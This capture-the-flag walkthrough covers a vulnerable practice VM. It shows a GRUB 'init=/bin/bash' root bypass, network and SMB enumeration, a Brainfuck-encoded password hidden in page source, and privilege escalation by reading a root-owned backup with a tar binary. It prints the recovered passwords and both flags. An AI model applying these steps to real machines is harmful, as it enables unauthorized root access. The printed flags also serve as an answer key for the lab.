## The Easy Way
> Since i can download the box and boot it from my vmware and choose how to boot on startup..<br>
> I've pressed `e` to edit out how to boot the machine.<br>
> At linux section i've just added `rw init=/bin/bash` and restarted the machine with `f10`
> when machine booted, I didnt needed no creds, i was root, did `cat /etc/passwd` and changed the user password, or just could straight look into the flags files.

## The right way
# Enum part:
>The machine booted up, i saw it showed eth0 IP `netdiscover -r <ip>/24` would work also)
> nmap revealed open ports were <br> http 80,10000,20000 <br> smb 139,445

# Foothold:
> `enum4linux -a <target IP>`--> reveals user name was cyber<br>
> going into port 80, pressed `Ctrl+u` and at the bottom were BrainFuck enctyped code:
```bash
<!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.


-->
```
> This decoded at this [site](https://md5decrypt.net/en/Brainfuck-translator/)<br>
> `cyber:.2uqPEfj3D<P'a-3`

# Pivot:
> now i could log into the website on port 10000 or machine with cyber.<br>
> home directory had `tar` execution file which was odd.<br>
> found manualy `/var/backups/.old_pass.bak`  that was belong to root. (made by root, and user can use it, so if i use it on root's file it should work)<br>
> I've used the tar command to archive the old_pass.bak into tar and extract it with cyber as the new owner of the file.
1. `./tar -cf <my-tar>.tar /var/bakcups/.old_pass.bak`
2. `./tar -xf <my-tar>.tar`
3. `cat ~/var/backups/.old_pass.bak` -> reveals `root:Ts&4&YurgtRX(=~h` <br>
4. logged in as root and got the root's flag.

# Flags:
1. User flag: 3mp!r3{You_Manage_To_Break_To_My_Secure_Access} <br>
2. Roots flag: 3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}
